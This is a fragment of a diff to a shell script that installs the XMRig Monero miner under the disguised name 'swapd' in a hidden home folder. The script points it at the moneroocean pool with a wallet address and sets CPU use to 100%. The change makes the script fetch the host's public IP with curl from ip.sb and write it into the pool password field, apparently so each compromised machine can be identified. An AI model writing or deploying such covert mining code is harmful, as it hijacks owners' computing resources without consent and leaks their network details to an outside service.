@@ -276,10 +276,10 @@ echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
 echo "PASS..."
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
 #PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-#PASS=`sh -c "(curl -4 ip.sb)"`
+PASS=`sh -c "(curl -4 ip.sb)"`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
@@ -289,12 +289,13 @@ fi
 if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 
 echo "sed"
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
 #sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' $HOME/.swapd/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
+#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
 #sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
 #sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
